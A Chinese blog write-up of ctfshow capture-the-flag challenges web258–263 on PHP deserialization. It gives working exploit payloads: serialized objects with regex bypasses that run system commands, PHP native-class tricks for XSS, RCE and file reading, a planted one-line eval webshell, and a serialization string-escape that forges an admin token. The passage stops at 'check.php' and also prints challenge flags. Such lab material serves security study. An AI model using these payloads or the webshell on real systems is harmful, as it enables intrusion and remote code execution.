<h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>正则过滤[<a href="https://so.csdn.net/so/search?q=oc&spm=1001.2101.3001.7020">oc</a>]是匹配o字符或者c字符，\d匹配一个数字字符，等价于[0-9]，+号是匹配前面的\d一次或者多次。下面只需要将O:11变成O:+11就可以绕过了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class"> &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>,<span class="string">&quot;O:+&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web259原生类利用"><a href="#web259原生类利用" class="headerlink" title="web259原生类利用"></a>web259原生类利用</h2><p><a href="https://docs.qq.com/doc/DT2xGQXZrQVBvR1RI">CTF中php原生类的利用 (qq.com)</a></p>
<p>在PHP7版本中，因为Error中带有<code>__toString</code>方法，该方法会将传入给<code>__toString</code>的参数原封不动的输出到浏览器。在这么一个过程中可能会产生XSS。</p>
<p>我们来随便弄一个DEMO试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">echo new $a($b);</span><br></pre></td></tr></table></figure>

<p>ERROR类中自动带有tostring魔术方法，我们如果这里把他当字符串输出，会自动触发tostring方法，如果这里是echo，即可造成XSS</p>
<p>Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">http://127.0.0.1/?a=Error&amp;b=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112125022805.png"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112125022805.png" alt="image-20211112125022805"></a></p>
<h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><p>和Error类一样，也自带tostring方法，也可以造成XSS</p>
<p><a href="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112125139238.png"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112125139238.png" alt="image-20211112125139238"></a></p>
<p>既然如此，可以会被PHP执行，我们可以换一种写法，用eval()函数让他造成RCE即可在实战中使用</p>
<p>DEMO:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">eval(&quot;echo new $a($b);&quot;);</span><br></pre></td></tr></table></figure>

<p><a href="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112131536484.png"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112131536484.png" alt="image-20211112131536484"></a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=Exception&amp;b=system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>

<p>因为echo new $a($b);会输出system(“whoami”)，然后会被eval放入代码中去执行，即可造成RCE</p>
<h2 id="遍历目录类"><a href="#遍历目录类" class="headerlink" title="遍历目录类"></a>遍历目录类</h2><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h3><p>DirectoryIterator类中有一个__construct()方法，他会构造一个迭代器，如果使用echo进行输出，他会返回迭代器的第一个</p>
<p>demo:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">echo new $a($b);</span><br></pre></td></tr></table></figure>

<p>我们这时候如果传入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=DirectoryIterator&amp;b=.</span><br></pre></td></tr></table></figure>

<p>此时是遍历当前目录，他回返回第一项，也就应该是一个点</p>
<p><a href="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112132453027.png"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112132453027.png" alt="image-20211112132453027"></a></p>
<p>有的师傅就说了，这有个勾八用，我们其实还可以使用glob:&#x2F;&#x2F;协议进行匹配其余的文件</p>
<p>例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=DirectoryIterator&amp;b=glob://flag*</span><br></pre></td></tr></table></figure>

<p>这里的*依旧是通配符，就会匹配当前目录下的带有flag的文件</p>
<p><a href="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112132648936.png"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112132648936.png" alt="image-20211112132648936"></a></p>
<p>这里如果不知道文件名，可以直接暴力搜索，使用正则匹配去使用</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=DirectoryIterator&amp;b=glob://f[a-z]*</span><br></pre></td></tr></table></figure>

<p><a href="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112132746091.png"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112132746091.png" alt="image-20211112132746091"></a></p>
<h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p>和Directorylterator差不多，不重复赘述</p>
<h3 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h3><p>GlobIterator和另外两个类差不多，不过glob是GlobIterator类本身自带的，因此在遍历的时候，就不需要带上glob协议头了，只需要后面的相关内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=GlobIterator&amp;b=f[a-z]*</span><br></pre></td></tr></table></figure>

<h2 id="读取文件类"><a href="#读取文件类" class="headerlink" title="读取文件类"></a>读取文件类</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h3><p>SplFileObject类为文件提供了一个面向对象接口，也就是这个类可以用来读文件</p>
<p>DEMO:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">echo new $a($b);</span><br></pre></td></tr></table></figure>

<p>我们传入?a&#x3D;SplFileObject&amp;b&#x3D;flag.php，即可读取我们flag.php里面的内容，但是他只能读一行！！！red</p>
<p><a href="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112133016528.png"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112133016528.png" alt="image-20211112133016528"></a></p>
<p>除了直接传文件名之外，我们是不是可以联系到php伪协议呢？不妨来试试，传入如下payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><a href="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112133442470.png"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112133442470.png" alt="image-20211112133442470"></a></p>
<h2 id="反射类"><a href="#反射类" class="headerlink" title="反射类"></a>反射类</h2><h3 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h3><p>ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作</p>
<p>反射类不仅仅可以建立对类的映射，也可以<strong>建立对PHP基本方法的映射</strong>，并且返回基本方法执行的情况。因此可以通过建立反射类<code>new ReflectionClass(system(&#39;cmd&#39;))</code>来执行命令</p>
<p>这里我们直接使用CTFshow的web109来作为例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">/* </span><br><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line"># @Author: h1xa </span><br><span class="line"># @Date:   2020-09-16 11:25:09 </span><br><span class="line"># @Last Modified by:   h1xa </span><br><span class="line"># @Last Modified time: 2020-09-29 22:02:34 </span><br><span class="line"></span><br><span class="line">*/ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">error_reporting(0); </span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; </span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;]; </span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;]; </span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123; </span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>已知了flag在<code>./fl36dg.txt</code>，命令执行<code>system(‘cat fl36dg.txt’)</code>获取flag，所以应该传入如下参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>

<p><a href="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112134027779.png"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112134027779.png" alt="image-20211112134027779"></a></p>
<h3 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod"></a>ReflectionMethod</h3><p>和ReflectionClass一样，直接上图</p>
<p><a href="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112134205330.png"><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112134205330.png" alt="image-20211112134205330"></a></p>
<p><code>Typecho_Db_Exception</code>类在&#x2F;var&#x2F;Typecho&#x2F;Db&#x2F;Query.php中，这里有一个<code>//__toString()</code>的注释，直接看__toString函数里的内容</p>
<p><a href="https://ch1e.gitee.io/2021/11/12/yuanshenglei/">PHP原生类在CTF当中的应用🛴 | ch1e的随笔 (gitee.io)</a></p>
<h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化后含有ctfshow_i_love_36D</p>
<p>直接get传参ctfshow_i_love_36D即可</p>
<p>ctfshow{95f2cc54-4c24-4de1-a5ef-8bc52a47a174}</p>
<h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password; </span><br><span class="line">    &#125; <span class="comment">//code 赋值code=username</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;  <span class="comment">//弱类型比较code=877+字符</span></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__sleep()	 	//使用serialize（）时触发 </span><br><span class="line">__destruct() 	//对象被销毁时触发，在脚本终止或对象引用计数为0时调用，通常会执行数据清除就或连接断开操作 </span><br><span class="line">__call() 		//在对象上下文中调用不可访问的方法时触发 ，通常用于错误处理，防止脚本因为调用错误而终止执行</span><br><span class="line">__callStatic() 	//在静态上下文中调用不可访问的方法时触发 </span><br><span class="line">__get() 		//用于从不可访问的属性读取数据，通常用于设置和获取对象私有属性</span><br><span class="line">__set() 		//用于将数据写入不可访问的属性，通常用于设置和获取对象私有属性</span><br><span class="line">__isset() 		//在不可访问的属性上调用isset()或empty()触发 </span><br><span class="line">__unset() 		//在不可访问的属性上使用unset()时触发 </span><br><span class="line">__invoke() 		//当脚本尝试将对象调用为函数时触发</span><br><span class="line">__clone()       //当把一个对象赋给另一个对象时自动调用</span><br><span class="line">__wakeup()		//unserialize函数会检查是否存在wakeup方法，如果存在则先调用wakeup方法，做一些必要的初始化连数据库等操作</span><br><span class="line">__construct() 	//PHP5允许在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法</span><br><span class="line">__destruct()	  //PHP5引入析构函数的概念，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</span><br><span class="line">__toString()	  //用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误</span><br></pre></td></tr></table></figure>

<p>file_put_contents — 将数据写入文件</p>
<p>如果 <code>filename</code>   不存在，将会创建文件。反之，存在的文件将会重写，除非设置   <strong><code>FILE_APPEND</code></strong> flag。  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>(<span class="string">&#x27;877.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//url编码一下get传参</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一句话木马</p>
<p>连接url&#x2F;877.php</p>
<p>执行1&#x3D;system(“ls &#x2F;“);</p>
<p>发现ctfshow{64baf76c-41a0-4795-922a-17076ed94eb2}</p>
<h2 id="web262-字符串逃逸"><a href="#web262-字符串逃逸" class="headerlink" title="web262 字符串逃逸"></a>web262 字符串逃逸</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$f = $_GET[&#x27;f&#x27;];</span><br><span class="line">$m = $_GET[&#x27;m&#x27;];</span><br><span class="line">$t = $_GET[&#x27;t&#x27;];</span><br><span class="line">if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span><br><span class="line">    $msg = new message($f,$m,$t);</span><br><span class="line">    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br><span class="line">    setcookie(&#x27;msg&#x27;,base64_encode($umsg));</span><br><span class="line">    echo &#x27;Your message has been sent&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>访问url&#x2F;message.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_COOKIE[&#x27;msg&#x27;]))&#123;</span><br><span class="line">    $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;]));</span><br><span class="line">    if($msg-&gt;token==&#x27;admin&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class message&#123;</span><br><span class="line"> </span><br><span class="line">public $token=&#x27;admin&#x27;;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a=new message();</span><br><span class="line"> </span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=1&amp;m=1&amp;t=1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="web263session反序列化漏洞"><a href="#web263session反序列化漏洞" class="headerlink" title="web263session反序列化漏洞"></a>web263session反序列化漏洞</h2><p><a href="https://www.jb51.net/article/116246.htm">深入浅析PHP的session反序列化漏洞问题_php实例_脚本之家 (jb51.net)</a></p>
<p><a href="https://www.cnblogs.com/meng-han/p/16851760.html">ctfshow web263(PHP的session反序列化漏洞) - hithub - 博客园 (cnblogs.com)</a></p>
<p>用dirsearch扫一下，发现<a href="http://www.zip文件,访问下载下来是网站源码./">www.zip文件，访问下载下来是网站源码。</a></p>
<p>index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	error_reporting(0);</span><br><span class="line">	session_start();</span><br><span class="line">	//超过5次禁止登陆</span><br><span class="line">	if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">		$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		 setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line">		 $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>check.php</p>
